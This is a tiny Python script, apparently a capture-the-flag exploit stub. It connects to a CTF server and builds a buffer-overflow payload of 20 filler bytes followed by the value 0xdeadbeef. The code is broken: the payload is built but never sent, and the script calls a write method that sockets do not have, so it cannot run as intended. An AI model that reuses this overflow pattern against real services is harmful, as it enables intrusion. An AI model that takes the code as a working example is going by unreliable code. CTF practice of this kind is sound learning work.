import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('ctf.osusec.org', 10000))
print(s.recv(100))

got = input()


send  = "A"*20 + "\xef\xbe\xad\xde" + "\n" 
s.write(str(got))

print(s.recv(1000))
print(s.recv(1000))
print(s.recv(1000))



